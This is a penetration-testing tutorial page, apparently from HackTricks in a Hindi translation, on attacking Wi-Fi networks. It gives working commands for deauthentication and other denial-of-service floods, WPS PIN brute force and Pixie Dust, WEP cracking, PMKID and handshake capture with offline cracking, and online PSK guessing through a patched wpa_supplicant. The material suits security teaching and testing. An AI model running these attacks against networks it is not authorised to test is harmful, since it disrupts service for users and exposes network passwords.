# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi बुनियादी कमांड्स
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## उपकरण

### Hijacker & NexMon (Android का आंतरिक Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**docker के साथ airgeddon चलाएँ**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

यह Evil Twin, KARMA, और Known Beacons हमलों को अंजाम दे सकता है और फिर एक phishing template का उपयोग करके नेटवर्क का असली password प्राप्त करने या social network credentials को capture करने में सफल हो सकता है।
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

यह टूल **WPS/WEP/WPA-PSK** attacks को स्वचालित रूप से चलाता है। यह स्वचालित रूप से:

- इंटरफ़ेस को monitor mode में सेट करता है
- संभावित नेटवर्क्स के लिए स्कैन करता है - और आपको लक्ष्य(ों) चुनने देता है
- यदि WEP - WEP attacks लॉन्च करता है
- यदि WPA-PSK
- यदि WPS: Pixie dust attack और bruteforce attack (सावधान रहें: brute-force attack में लंबा समय लग सकता है)। ध्यान दें कि यह null PIN या database/generated PINs को आज़माता नहीं है।
- AP से PMKID को capture करने की कोशिश करता है ताकि इसे crack किया जा सके
- AP के clients को deauthenticate करने की कोशिश करता है ताकि handshake capture कर सके
- यदि PMKID या Handshake मिले, तो top5000 passwords का उपयोग करके bruteforce करने की कोशिश करता है।

## हमलों का सारांश

- **DoS**
- Deauthentication/disassociation -- सभी को डिस्कनेक्ट कर देता है (या किसी विशेष ESSID/Client को)
- Random fake APs -- नेटवर्क छिपाने के लिए, संभवतः स्कैनर्स को क्रैश करने के लिए
- Overload AP -- AP को kill करने की कोशिश (आम तौर पर बहुत उपयोगी नहीं)
- WIDS -- IDS के साथ प्रयोग
- TKIP, EAPOL -- कुछ विशिष्ट attacks जो कुछ APs को DoS कर सकते हैं
- **Cracking**
- Crack **WEP** (कई tools और methods)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- captive portal creds capture करने और/या LAN attacks करने के लिए उपयोगी
- **WPA-PSK** Evil Twin -- पासवर्ड पता होने पर network attacks के लिए उपयोगी
- **WPA-MGT** -- कंपनी credentials capture करने के लिए उपयोगी
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- captive portal creds capture करने और/या LAN attacks करने के लिए उपयोगी
- **+ WPA** -- WPA handshakes capture करने के लिए उपयोगी

## Open / OWE नेटवर्क्स के त्वरित नोट्स

- **Passive capture** open SSIDs पर monitor mode और tcpdump के साथ अभी भी काम करता है:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) प्रति‑स्टेशन key exchange करता है (no PSK), इसलिए air frames "open" SSIDs पर भी एन्क्रिप्टेड रहते हैं। WPA3‑based होने के कारण यह **802.11w PMF** भी लागू करता है, जो spoofed deauth/disassoc फ्रेम्स को ब्लॉक करता है।
- OWE **does not authenticate** joiners: कोई भी associate कर सकता है, इसलिए marketing claims पर भरोसा करने के बजाय **client isolation** की पुष्टि करें। Isolation न होने पर local L2 पर ARP spoofing या responder-style poisoning अभी भी काम करता है।
- **Evil Twin** open/OWE SSIDs पर मजबूत सिग्नल दिखाकर अभी भी संभव है; PMF केवल deauth शॉर्टकट को हटाता है। अगर पीड़ित forged TLS cert स्वीकार कर लेते हैं, तो पूर्ण HTTP(S) MitM फिर से हासिल हो जाता है।
- open guest Wi-Fi पर Broadcast poisoning आसानी से creds/hashes (LLMNR/NBT-NS/mDNS) दे देता है। See:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**विवरण स्रोत** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, Wi‑Fi hacking में एक प्रचलित तरीका हैं, जिनमें "management" frames की नकल कर **डिवाइसों को नेटवर्क से ज़बरदस्ती डिस्कनेक्ट** किया जाता है। ये unencrypted packets clients को यह भरोसा दिलाते हैं कि वे वैध नेटवर्क से हैं, जिससे attackers WPA handshakes इकट्ठा करके cracking कर सकते हैं या नेटवर्क कनेक्शनों को लगातार बाधित कर सकते हैं। यह तरीका अपनी सादगी में चिंताजनक है, व्यापक रूप से उपयोग होता है और नेटवर्क सुरक्षा के लिए गंभीर निहितार्थ रखता है।

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 का मतलब deauthentication है
- 1 भेजने के लिए deauths की संख्या है (आप चाहें तो कई भेज सकते हैं); 0 का मतलब उन्हें लगातार भेजना है
- -a 00:14:6C:7E:40:80 access point का MAC address है
- -c 00:0F:B5:34:30:30 उस client का MAC address है जिसे deauthenticate किया जाना है; यदि यह छोड़ा जाए तो broadcast deauthentication भेजा जाता है (यह हमेशा काम नहीं करता)
- ath0 इंटरफ़ेस का नाम है

### डिसएसोसिएशन पैकेट्स

**डिसएसोसिएशन पैकेट्स**, deauthentication packets के समान, Wi‑Fi नेटवर्क में उपयोग किए जाने वाले एक प्रकार के management frame होते हैं। ये पैकेट्स किसी डिवाइस (जैसे लैपटॉप या स्मार्टफोन) और access point (AP) के बीच कनेक्शन को तोड़ने का काम करते हैं। डिसएसोसिएशन और deauthentication के बीच मुख्य अंतर उनके उपयोग के परिदृश्यों में होता है। जबकि AP **deauthentication packets को नेटवर्क से rogue devices को स्पष्ट रूप से हटाने के लिए भेजता है, disassociation packets आमतौर पर तब भेजे जाते हैं जब AP शटडाउन, रीस्टार्ट, या स्थानांतरित हो रहा होता है**, जिससे सभी जुड़े नोड्स का डिसकनेक्शन आवश्यक हो जाता है।

**यह हमला mdk4(mode "d") द्वारा किया जा सकता है:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **mdk4 द्वारा और अधिक DOS attacks**

**यहाँ** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

यह beacon frames भेजता है ताकि clients पर fake APs दिखें। यह कभी-कभी network scanners और यहां तक कि drivers को भी crash कर सकता है!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

रेंज के भीतर सभी पहुँच योग्य Access Points (APs) को authentication frames भेजने से इन APs पर ओवरलोड हो सकता है, खासकर जब कई clients शामिल हों। यह तीव्र ट्रैफ़िक सिस्टम अस्थिरता का कारण बन सकता है, जिससे कुछ APs freeze या यहाँ तक कि reset भी हो सकते हैं।
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) से यह जाँच होती है कि SSID ठीक से प्रकट हो रहा है या नहीं और AP की रेंज की पुष्टि होती है। यह तकनीक, **bruteforcing hidden SSIDs** को wordlist के साथ या बिना मिलाकर, छिपे हुए नेटवर्कों की पहचान और उन तक पहुँच बनाने में मदद करती है।

**ATTACK MODE m: Michael Countermeasures Exploitation**

विभिन्न QoS queues को random या duplicate packets भेजने से **TKIP APs** पर **Michael Countermeasures** ट्रिगर हो सकती हैं, जिससे AP एक मिनट के लिए शटडाउन हो जाता है। यह तरीका एक प्रभावी **DoS** (Denial of Service) attack tactic है।
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

किसी AP पर **EAPOL Start frames** की बाढ़ **fake sessions** बनाती है, जिससे AP पर दबाव बढ़ता है और वैध clients ब्लॉक हो जाते हैं। वैकल्पिक रूप से, **fake EAPOL Logoff messages** इंजेक्ट करने से clients को जबरन डिस्कनेक्ट किया जा सकता है; ये दोनों तरीके नेटवर्क सेवा को प्रभावी रूप से बाधित करते हैं।
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Attacks for IEEE 802.11s mesh networks**

मेष नेटवर्क में लिंक प्रबंधन और रूटिंग पर विभिन्न हमले।

**ATTACK MODE w: WIDS Confusion**

क्लाइंट्स को कई WDS nodes या fake rogue APs से क्रॉस-कनेक्ट करने से Intrusion Detection and Prevention Systems को हेरफेर किया जा सकता है, जिससे भ्रम और संभावित सिस्टम दुरुपयोग हो सकता है।
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

एक packet fuzzer जो विविध packet स्रोतों और पैकेट मैनिपुलेशन के लिए modifiers के व्यापक सेट के साथ आता है।

### **Airggedon**

_**Airgeddon**_ पिछले हिस्सों में प्रस्तावित अधिकांश attacks प्रदान करता है:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) राउटर से devices को जोड़ने की प्रक्रिया को सरल बनाता है, और **WPA** या **WPA2** Personal से एन्क्रिप्ट किए गए नेटवर्क्स के लिए setup की गति और सुगमता बढ़ाता है। यह आसानी से compromised हुई **WEP** security के लिए प्रभावी नहीं है। WPS एक 8-digit PIN का उपयोग करता है, जिसे दो हिस्सों में validate किया जाता है, जिससे इसकी संभावनाएँ सीमित होने के कारण (11,000 संभावनाएँ) यह brute-force attacks के प्रति संवेदनशील बन जाता है।

### WPS Bruteforce

इस कार्रवाई के लिए 2 मुख्य tools हैं: Reaver और Bully।

- **Reaver** को WPS के खिलाफ एक मजबूत और व्यावहारिक attack के रूप में डिज़ाइन किया गया है, और इसे विभिन्न प्रकार के access points और WPS implementations के खिलाफ टेस्ट किया गया है।
- **Bully** WPS brute force attack का एक **new implementation** है, जो C में लिखा गया है। इसके पास original reaver code की तुलना में कई फायदे हैं: कम dependencies, बेहतर memory और cpu प्रदर्शन, endianness का सही हैंडलिंग, और अधिक robust विकल्पों का सेट।

यह attack **WPS PIN's vulnerability** का फायदा उठाता है, विशेषकर पहले चार अंकों के प्रकटीकरण और अंतिम अंक के checksum के रूप में होने की वजह से, जिससे brute-force attack आसान हो जाता है। हालांकि, aggressive attackers के खिलाफ defenses जैसे **blocking MAC addresses** brute-force को रोकने के लिए लागू किए जा सकते हैं, जिसके कारण attack जारी रखने के लिए **MAC address rotation** की आवश्यकता होती है।

Bully या Reaver जैसे tools से WPS PIN प्राप्त करने पर attacker WPA/WPA2 PSK निकाल सकता है, जिससे **persistent network access** सुनिश्चित होता है।
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

यह परिष्कृत तरीका ज्ञात कमजोरियों का उपयोग करके WPS PINs को लक्षित करता है:

1. **Pre-discovered PINs**: एक ऐसे database का उपयोग करें जिसमें उन निर्माताओं से जुड़े ज्ञात PINs होते हैं जो एकसमान WPS PINs का उपयोग करते हैं। यह database MAC-addresses के पहले तीन ऑक्टेट्स को इन निर्माताओं के संभावित PINs के साथ correlate करता है।
2. **PIN Generation Algorithms**: ComputePIN और EasyBox जैसे एल्गोरिदम का लाभ उठाएँ, जो AP के MAC-address के आधार पर WPS PINs की गणना करते हैं। Arcadyan algorithm अतिरिक्त रूप से एक device ID की आवश्यकता भी मांगता है, जो PIN जनरेशन प्रक्रिया में एक और परत जोड़ता है।

### WPS Pixie Dust attack

**Dominique Bongard** ने कुछ Access Points (APs) में secret codes, जिन्हें **nonces** (**E-S1** और **E-S2**) कहा जाता है, बनाने में एक flaw खोजी। यदि इन nonces का पता लग जाता है, तो AP का WPS PIN क्रैक करना आसान हो जाता है। AP PIN को एक विशेष कोड (hash) के भीतर प्रकट करता है ताकि यह साबित हो सके कि यह वैध है और कोई fake (rogue) AP नहीं है। ये nonces मूलतः उस "keys" के समान हैं जो उस "safe" को अनलॉक करते हैं जिसमें WPS PIN रखा होता है। अधिक जानकारी के लिए देखें [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

साधारण शब्दों में, समस्या यह है कि कुछ APs ने कनेक्शन प्रक्रिया के दौरान PIN को एन्क्रिप्ट करने के लिए पर्याप्त रूप से यादृच्छिक (random) keys का उपयोग नहीं किया। इससे PIN बाहरी नेटवर्क से अनुमान लगाने के लिए vulnerable हो जाता है (offline brute force attack)।
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
यदि आप डिवाइस को monitor mode में स्विच नहीं करना चाहते हैं, या `reaver` और `bully` में कोई समस्या आ रही है, तो आप [OneShot-C](https://github.com/nikita-yfh/OneShot-C) आज़मा सकते हैं। यह टूल monitor mode में स्विच किए बिना Pixie Dust attack चला सकता है।
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

कुछ खराब डिज़ाइन किए गए सिस्टम यहां तक कि **Null PIN** (एक खाली या मौजूद नहीं PIN) को access देने की अनुमति देते हैं, जो कि काफी असामान्य है। टूल **Reaver** इस vulnerability के लिए परीक्षण करने में सक्षम है, जबकि **Bully** नहीं।
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

सभी प्रस्तावित WPS attacks को आसानी से _**airgeddon.**_ का उपयोग करके किया जा सकता है।

![](<../../images/image (219).png>)

- 5 और 6 आपको **your custom PIN** आज़माने देते हैं (यदि आपके पास कोई है)
- 7 और 8 **Pixie Dust attack** को अंजाम देते हैं
- 13 आपको **NULL PIN** परीक्षण करने की अनुमति देता है
- 11 और 12 चयनित AP से संबंधित PINs को उपलब्ध डेटाबेस से पुनःप्राप्त करेंगे और संभावित PINs उत्पन्न करेंगे: ComputePIN, EasyBox और वैकल्पिक रूप से Arcadyan का उपयोग करते हुए (अनुशंसित, क्यों नहीं?)
- 9 और 10 हर संभव **PIN** का परीक्षण करेंगे

## **WEP**

**क्यों यह कमजोर पड़ता है**

- RC4 seed सिर्फ **IV (24 bits) + shared key** होता है। IV cleartext है, छोटा (2^24), और जल्दी repeat हो जाता है, इसलिए एक ही IV वाले ciphertexts keystream को पुनः उपयोग करते हैं।
- समान keystream वाले दो ciphertexts का XORing `PlaintextA ⊕ PlaintextB` को leaks करता है; predictable headers + RC4 KSA biases (**FMS**) आपको key bytes पर “vote” करने देते हैं। **PTW** इसे ARP traffic का उपयोग करके optimises करता है ताकि requirements लाखों की बजाय दसियों हजार packets तक गिर जाएँ।
- Integrity केवल **CRC32** (linear/unkeyed) है, इसलिए एक attacker bits flip कर सकता है और key के बिना CRC32 recompute कर सकता है → packet forgery/replay/ARP injection करते हुए IVs का इंतज़ार किया जा सकता है।

Practical break is deterministic:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon अभी भी यदि आप निर्देशित UI पसंद करते हैं तो एक "All-in-One" WEP वर्कफ़्लो प्रदान करता है।

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

2018 में, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) एक नया हमला तरीका, जो अनूठा है क्योंकि इसे केवल **one single packet** की ज़रूरत होती है और लक्ष्य AP से किसी भी clients के कनेक्ट होने की आवश्यकता नहीं होती — सिर्फ attacker और AP के बीच इंटरैक्शन।

कई आधुनिक राउटर एसोसिएशन के दौरान **पहला EAPOL** फ्रेम में एक **वैकल्पिक फ़ील्ड** जोड़ते हैं, जिसे `Robust Security Network` कहा जाता है। इसमें `PMKID` शामिल होता है।

जैसा कि मूल पोस्ट में समझाया गया है, **PMKID** ज्ञात डेटा का उपयोग करके बनाया जाता है:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
चूँकि "PMK Name" constant है, हमें AP और station का BSSID पता है, और `PMK` full 4-way handshake वाला ही identical है, **hashcat** इस जानकारी का उपयोग करके PSK को crack करके passphrase recover कर सकता है!

इस जानकारी को **gather** करने और पासवर्ड को स्थानीय रूप से **bruteforce** करने के लिए आप कर सकते हैं:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
ये **PMKIDs captured** **console** में दिखेंगे और साथ ही \_ **/tmp/attack.pcap**\_ में **saved** भी होंगे।\
अब, कैप्चर को **hashcat/john** फॉर्मेट में कन्वर्ट करें और crack करें:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
कृपया ध्यान दें कि एक सही hash का प्रारूप **4 भागों** में होता है, जैसे: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`। अगर आपका **केवल** **3 भाग** है, तो यह **अमान्य** है (PMKID capture मान्य नहीं था)।

ध्यान दें कि `hcxdumptool` **भी capture handshakes** करता है (ऐसा कुछ दिखाई देगा: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**)। आप `cap2hccapx` का उपयोग करके इन **handshakes** को **hashcat**/**john** फॉर्मेट में **परिवर्तित** कर सकते हैं।
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_मैंने देखा है कि इस tool से कैप्चर किए गए कुछ handshakes सही password जानने के बावजूद भी cracked नहीं हो पाए। मैं सुझाव दूंगा कि यदि संभव हो तो पारंपरिक तरीके से भी handshakes कैप्चर करें, या इस tool का उपयोग करके कई handshakes कैप्चर करें।_

### Handshake कैप्चर

An attack on **WPA/WPA2** networks can be executed by capturing a **handshake** and attempting to **crack** the password **offline**. This process involves monitoring the communication of a specific network and **BSSID** on a particular **channel**. Here's a streamlined guide:

1. लक्षित नेटवर्क का **BSSID**, **channel**, और एक **connected client** पहचानें।
2. निर्दिष्ट **channel** और **BSSID** पर नेटवर्क ट्रैफ़िक की निगरानी के लिए `airodump-ng` का उपयोग करें, और उम्मीद करें कि कोई handshake कैप्चर हो सके। कमांड इस प्रकार दिखेगा:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. handshake को कैप्चर करने की संभावना बढ़ाने के लिए, client को क्षणिक रूप से नेटवर्क से डिस्कनेक्ट करके re-authentication मजबूर करें। यह `aireplay-ng` कमांड का उपयोग करके किया जा सकता है, जो client को deauthentication packets भेजता है:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_ध्यान दें कि चूंकि client को deauthenticated किया गया था, वह किसी अलग AP से कनेक्ट करने की कोशिश कर सकता है या अन्य मामलों में किसी अलग network से कनेक्ट कर सकता है._

जब `airodump-ng` में कुछ handshake जानकारी दिखाई दे तो इसका मतलब है कि handshake captured हो चुका है और आप listening बंद कर सकते हैं:

![](<../../images/image (172) (1).png>)

एक बार handshake captured हो जाने पर आप इसे `aircrack-ng` के साथ **crack** कर सकते हैं:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### फ़ाइल में handshake है या नहीं जांचें

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_यदि यह टूल किसी ESSID का अधूरा handshake उस ESSID के पूरा किए गए handshake से पहले पा लेता है, तो यह मान्य handshake को पहचान नहीं पाएगा।_

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### `wpa_supplicant` ctrl socket के माध्यम से तेज़ ऑनलाइन PSK अनुमान (no clients/PMKID)

जब आस-पास कोई clients नहीं होते और AP PMKID को अस्वीकार करता है, तो आप supplicants को respawn किए बिना ऑनलाइन PSKs को क्रमिक रूप से आज़मा सकते हैं:

- `wpa_supplicant.c` में पैच करें ताकि auth failure backoff logic (around `ssid->auth_failures`) में `dur = 0;` मजबूर किया जा सके, जिससे temporary-disable timer प्रभावी रूप से निष्क्रिय हो जाए।
- control socket के साथ एक single daemon चलाएँ:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- इसे control interface के माध्यम से चलाएँ, उसी scan और network का पुन: उपयोग करते हुए:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
सॉकेट इवेंट्स (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) पढ़ने वाला एक छोटा Python लूप बिना scan overhead के ~100 अनुमान लगभग 5 मिनट में टेस्ट कर सकता है। यह फिर भी noisy और detectable है, लेकिन प्रति-प्रयास process restarts और backoff delays से बचाता है।

## **WPA Enterprise (MGT)**

**enterprise WiFi setups** में आप विभिन्न authentication methods देखेंगे, जो अलग-अलग security स्तर और management सुविधाएँ प्रदान करते हैं। जब आप नेटवर्क ट्रैफ़िक की जाँच के लिए `airodump-ng` जैसे tools का उपयोग करते हैं, तो आप इन authentication types के identifiers देख सकते हैं। कुछ सामान्य methods में शामिल हैं:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- यह मेथड EAP-PEAP के भीतर hardware tokens और one-time passwords को सपोर्ट करता है। MSCHAPv2 के विपरीत, यह peer challenge का उपयोग नहीं करता और पासवर्ड्स को access point को plaintext में भेजता है, जिससे downgrade attacks का जोखिम होता है।
2. **EAP-MD5 (Message Digest 5)**:
- इसमें क्लाइंट से पासवर्ड का MD5 hash भेजना शामिल है। यह **सिफारिश नहीं की जाती** क्योंकि यह dictionary attacks के प्रति कमजोर है, server authentication की कमी है, और session-specific WEP keys generate करने में असमर्थ है।
3. **EAP-TLS (Transport Layer Security)**:
- यह authentication के लिए client-side और server-side certificates दोनों का उपयोग करता है और संचार को सुरक्षित करने के लिए user-based और session-based WEP keys को dynamic रूप से generate कर सकता है।
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- यह एक encrypted tunnel के माध्यम से mutual authentication प्रदान करता है, और dynamic, per-user, per-session WEP keys निकालने का तरीका देता है। इसे केवल server-side certificates की आवश्यकता होती है, जबकि clients credentials का उपयोग करते हैं।
5. **PEAP (Protected Extensible Authentication Protocol)**:
- यह सुरक्षित संचार के लिए TLS tunnel बनाकर EAP की तरह काम करता है। टनल द्वारा प्रदान की गई सुरक्षा के कारण यह EAP के ऊपर कमजोर authentication protocols के उपयोग की अनुमति देता है।
- **PEAP-MSCHAPv2**: अक्सर PEAP के रूप में संदर्भित, यह vulnerable MSCHAPv2 challenge/response mechanism को protective TLS tunnel के साथ जोड़ता है।
- **PEAP-EAP-TLS (or PEAP-TLS)**: EAP-TLS के समान है लेकिन certificates का आदान-प्रदान करने से पहले TLS tunnel शुरू करता है, जिससे अतिरिक्त सुरक्षा परत मिलती है।

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### यूज़रनेम कैप्चर

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) लगता है कि अगर आप **EAP** का उपयोग कर रहे हैं तो **"Identity"** **messages** को **supported** होना चाहिए, और **username** **"Response Identity"** messages में **clear** में भेजा जाएगा।

यहाँ तक कि सबसे secure authentication methods में से एक **PEAP-EAP-TLS** का उपयोग करते हुए भी, **EAP प्रोटोकॉल में भेजे गए username को capture करना** संभव है। ऐसा करने के लिए, **capture a authentication communication** करें (एक चैनल के अंदर `airodump-ng` शुरू करें और उसी interface में `wireshark` चलाएँ) और पैकेट्स को `eapol` द्वारा filter करें.\
"**Response, Identity**" पैकेट के भीतर, क्लाइंट का **username** दिखाई देगा।

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding EAP-PEAP और EAP-TTLS दोनों द्वारा सपोर्ट की जाती है। WiFi नेटवर्क के संदर्भ में, association प्रक्रिया के दौरान access point (AP) आम तौर पर EAP-Identity request आरंभ करता है। उपयोगकर्ता की anonymity की सुरक्षा सुनिश्चित करने के लिए, उपयोगकर्ता के डिवाइस पर EAP क्लाइंट का उत्तर केवल वह आवश्यक जानकारी ही भेजता है जो initial RADIUS server को request प्रोसेस करने के लिए चाहिए। इस कॉन्सेप्ट को निम्न परिदृश्यों के माध्यम से समझाया गया है:

- EAP-Identity = anonymous
- इस परिदृश्य में, सभी उपयोगकर्ता अपना उपयोगकर्ता पहचानकर्ता के रूप में pseudonymous "anonymous" का उपयोग करते हैं। initial RADIUS server या तो EAP-PEAP या EAP-TTLS server के रूप में कार्य करता है, जो PEAP या TTLS प्रोटोकॉल के server-side को संभालता है। फिर inner (protected) authentication method या तो लोकल रूप से संभाला जाता है या इसे remote (home) RADIUS server को delegated किया जाता है।
- EAP-Identity = anonymous@realm_x
- इस स्थिति में, विभिन्न realms के उपयोगकर्ता अपनी पहचान छुपाते हुए अपने-अपने realms की जानकारी देते हैं। इससे initial RADIUS server EAP-PEAP या EAP-TTLS requests को उनके home realms के RADIUS servers को proxy कर सकता है, जो PEAP या TTLS server के रूप में कार्य करते हैं। initial RADIUS server केवल एक RADIUS relay node के रूप में कार्य करता है।
- विकल्प के रूप में, initial RADIUS server EAP-PEAP या EAP-TTLS server के रूप में कार्य कर सकता है और या तो protected authentication method को संभालेगा या इसे किसी अन्य server को forward करेगा। यह विकल्प विभिन्न realms के लिए अलग नीतियाँ configure करने की सुविधा देता है।

EAP-PEAP में, एक बार जब TLS tunnel PEAP server और PEAP client के बीच स्थापित हो जाता है, तो PEAP server एक EAP-Identity request आरंभ करता है और उसे TLS tunnel के माध्यम से भेजता है। क्लाइंट इस दूसरी EAP-Identity request का उत्तर देते हुए encrypted tunnel के माध्यम से उपयोगकर्ता की वास्तविक identity वाला EAP-Identity response भेजता है। यह तरीका 802.11 ट्रैफ़िक पर किसी भी eavesdropper को उपयोगकर्ता की वास्तविक पहचान उजागर करने से प्रभावी तरीके से रोकता है।

